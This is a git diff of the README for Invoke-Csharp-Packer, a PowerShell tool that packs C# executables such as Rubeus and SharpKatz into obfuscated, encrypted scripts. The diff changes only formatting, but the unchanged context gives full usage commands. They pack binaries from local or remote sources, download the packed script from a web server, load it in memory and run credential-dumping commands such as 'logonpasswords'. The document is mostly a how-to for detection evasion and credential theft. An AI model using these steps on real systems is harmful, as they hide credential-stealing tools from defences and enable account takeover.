@@ -15,15 +15,15 @@ It generates an obfuscated and encrypted PowerShell script that contains the (C#
 #### USAGE
   - Step 1. Generate an obfuscated & encrypted PowerShell script that contains your (C#) .NET executable file (e.g. Rubeus.exe, Sharpkatz.exe) stored locally or on a remote web server.
 
-_1.1 Examples with a C# binary file stored locally_  
+    _Examples with a (C#) .NET executable file stored locally_  
 ```
 PS C:\> Import-Module ./Invoke-Csharp-Packer.ps1
 PS C:\> Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1
 --- or ---
 PS C:\> Invoke-Csharp-Packer -FilePath C:\path\Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 -Sandbox
-``` 
+```  
 
-_1.2. Examples with a a C# binary file stored on a remote web server_  
+    _Examples with a (C#) .NET executable file stored on a remote web server_  
 ```
 PS C:\> Import-Module ./Invoke-Csharp-Packer.ps1
 PS C:\> Invoke-Csharp-Packer -FileUrl https://URL/Csharp-binary.exe -OutFile C:\path\Packed-Csharp-binary.ps1 
@@ -39,8 +39,8 @@ PS C:\> WGET -URI https://URL/Packed-Csharp-binary.ps1 -OutFile C:\temp\Packed-C
 PS C:\> Import-Module C:\temp\Packed-Csharp-binary.ps1
 PS C:\> Invoke-Packed-NET-Executable argument1 argument2 argument3 ...
 ``` 
-Example with a packed version of Rubeus.exe: ```Invoke-Packed-NET-Executable logonsession /current```  
-Example with a packed version of Sharpkatz.exe: ```Invoke-Packed-NET-Executable --Command logonpasswords``` 
+  Example with a packed version of Rubeus.exe: ```Invoke-Packed-NET-Executable logonsession /current```  
+  Example with a packed version of Sharpkatz.exe: ```Invoke-Packed-NET-Executable --Command logonpasswords``` 
 
 
 #### LICENSE
